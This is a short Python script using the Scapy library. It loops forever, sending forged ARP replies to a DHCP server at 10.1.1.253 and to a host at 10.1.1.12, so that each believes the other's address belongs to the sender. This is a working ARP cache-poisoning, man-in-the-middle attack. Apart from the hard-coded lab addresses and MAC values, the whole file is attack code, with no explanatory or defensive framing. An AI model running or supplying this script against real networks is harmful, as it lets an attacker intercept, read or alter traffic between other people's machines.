from scapy.all import *

dhcp_ip = "10.1.1.253"
node1_ip = "10.1.1.100"
node2_ip = "10.1.1.12"

node2_mac = "08:00:27:93:02:66"
dhcp_mac = "08:00:27:e0:92:42"

while True:
    ans, unans = sr(ARP(op=2, pdst=dhcp_ip, psrc=node2_ip, hwdst=dhcp_mac))
    ans, unans = sr(ARP(op=2, pdst=node2_ip, psrc=dhcp_ip, hwdst=node2_mac))
